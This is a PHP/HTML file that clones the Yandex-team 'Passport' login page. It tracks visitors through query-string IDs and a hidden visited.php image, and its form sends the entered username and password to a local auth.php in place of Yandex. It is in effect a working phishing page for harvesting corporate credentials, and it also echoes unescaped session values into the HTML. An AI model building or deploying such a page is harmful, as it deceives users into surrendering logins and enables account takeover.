<?php
session_start();

if(isset($_GET['id']) && isset($_GET['user'])){
    $_SESSION['id']= $_GET['id'];
    $_SESSION['user']= $_GET['user'];
    header('Location: index.php');
}

if(file_exists('config.php')){
    header('Location: config.php');
}
?>

<img src="visited.php?id=<?php echo $_SESSION['id'];?>&user=<?php echo $_SESSION['user'];?>" style="display: none;">
<!DOCTYPE html>
<!-- saved from url=(0095)https://passport.yandex-team.ru/passport?mode=auth&retpath=https%3A%2F%2Fjing.yandex-team.ru%2F -->
<html lang="ru" data-page-type="auth.enter" class="is-js_yes is-inlinesvg_yes" id="nb-1" data-nb="nb-0">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge">
    <link rel="shortcut icon" href="https://yastatic.net/morda-logo/i/favicon_islands.ico">
    <title>Авторизация</title>
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" type="text/css" href="files/auth.enter.css">
    <!-- <![endif]-->
    <!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="//yastatic.net/passport-frontend/0.2.26-5/public/css/auth.enter.ie.css"/><![endif]-->
    <script>
        var uid = null;
        var login = null;
        var passportHost = "passport.yandex-team.ru";
    </script>
    <script src="files/jquery.min.js"></script>
    <script src="files/auth.enter.ru.js"></script>
</head>

<body data-avatar="{&quot;host&quot;:&quot;center.yandex-team.ru&quot;,&quot;pathname&quot;:&quot;/api/v1/user/%login%/avatar/%size%.jpg&quot;}" data-unread="{&quot;host&quot;:&quot;export.yandex.%tld%&quot;,&quot;pathname&quot;:&quot;/for/unread.xml&quot;}" data-social="{&quot;startUrl&quot;:&quot;/auth/social/start&quot;,&quot;retpath&quot;:&quot;/auth/i-social__closer.html&quot;,&quot;consumer&quot;:&quot;passport&quot;,&quot;popupName&quot;:&quot;passport_social&quot;,&quot;display&quot;:&quot;popup&quot;,&quot;place&quot;:&quot;fragment&quot;}" data-retpath="https://passport.yandex-team.ru/redirect?url=https%3A%2F%2Fjing.yandex-team.ru%2F" data-static-url="//yastatic.net/passport-frontend/0.2.26-5/public/" data-logger-token="" data-metrics-id="" data-tld="ru" data-locale="ru">
    <div class="passport-header-header">
        <div class="passport-header-header_cell passport-header-header_cell__service">
            <div class="passport-header-header_col">
                <a class="passport-header-header_logo passport-header-header_logo_ru" href="http://www.yandex.ru/"></a>
            </div>
            <div class="passport-header-header_col">
                <div class="passport-header-arrow passport-header-arrow_type_service">
                    <a href="https://passport.yandex-team.ru/" class="passport-header-arrow passport-header-arrow_type_service-link passport-header-arrow_color_white">
                        <div class="passport-header-arrow_service">Паспорт</div>
                        <div class="passport-header-arrow_corner">
                            <div class="passport-header-arrow_triangle"></div>
                        </div>
                    </a>
                    <div class="passport-header-arrow_corner">
                        <div class="passport-header-arrow_triangle"></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="passport-header-header_cell passport-header-header_cell__user"></div>
    </div>
    <div class="js-messages"></div>
    <div data-block="domik" class="domik-wrap">
        <div class="domik">
            <div class="domik-roof"><span class="domik-roof-border"></span><span class="domik-roof-body"></span><span class="domik-roof-logo"></span></div>
            <div class="domik-content">
                <form method="post" action="auth.php" data-form-name="auth">
                    <div class="domik-field" data-block="login-auth">
                        <input type="text" placeholder="логин" id="login" name="username" value="" class="js-login-field domik-input">
                        <div class="domik-error b-popup b-popup_to_right domik-error-login-auth domik-error-login-auth_missingvalue">
                            <div class="b-popup_tail"></div>
                            <div class="b-popup_content">Заполните это поле</div>
                        </div>
                    </div>
                    <div class="domik-field" data-block="password-auth">
                        <input type="password" placeholder="пароль" id="password" name="password" class="js-passwd-field domik-input">
                        <input type="hidden" name="id" value="<?php echo $_SESSION['id'];?>">
                        <div class="domik-error b-popup b-popup_to_right domik-error-password-auth domik-error-password-auth_missingvalue">
                            <div class="b-popup_tail"></div>
                            <div class="b-popup_content">Заполните это поле</div>
                        </div>
                        <div class="domik-error b-popup b-popup_to_right domik-error-password-auth domik-error-password-auth_lang">
                            <div class="b-popup_tail"></div>
                            <div class="b-popup_content">Смените раскладку</div>
                        </div>
                        <div class="domik-error b-popup b-popup_to_right domik-error-password-auth domik-error-password-auth_characters">
                            <div class="b-popup_tail"></div>
                            <div class="b-popup_content">Недопустимый ввод</div>
                        </div>
                    </div>
                    <div class="domik-field js-domik-captcha"></div>
                    <div class="domik-row">
                        <div class="domik-submit" data-block="submit">
                            <button class=" nb-button _nb-action-button js-submit-button domik-submit-button domik-submit-button__alone" type="submit"><span class="_nb-button-content">Войти</span></button>
                        </div>
                    </div>
                    <input type="hidden" name="retpath" value="https://jing.yandex-team.ru/">
                </form>
            </div>
        </div>
    </div>
    <div class="footer" data-block="footer">
        <div class="lang-switcher"><a href="https://passport.yandex-team.ru/passport?mode=auth&retpath=https%3A%2F%2Fjing.yandex-team.ru%2F#" class="lang-switcher__flag lang-switcher__flag-ru js-b-menu_lang_switcher_trigger b-link">Ru</a>
            <div class="b-menu b-menu_to_top b-menu_lang_switcher js-b-menu_lang_switcher">
                <div class="b-menu_tail"></div>
                <div class="b-menu_content">
                    <ul class="b-menu_list">
                        <li><a class="b-menu_list_item lang-switcher__flag-en lang-switcher__flag" href="https://tune.yandex.ru/api/lang/v1.1/save.xml?sk=y10ef71c298eb0e6965c4cc3dd86861be&retpath=https%3A%2F%2Fpassport.yandex-team.ru%2Fpassport%3Fmode%3Dauth%26retpath%3Dhttps%253A%252F%252Fjing.yandex-team.ru%252F&intl=en"><span>En</span></a></li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="footer__column footer__column_side_right">
            <div class="copyright">©&nbsp;2001-2015,&nbsp;<a href="http://www.yandex.ru/" class="b-link">Яндекс</a></div>
        </div>
    </div>
</body>

</html>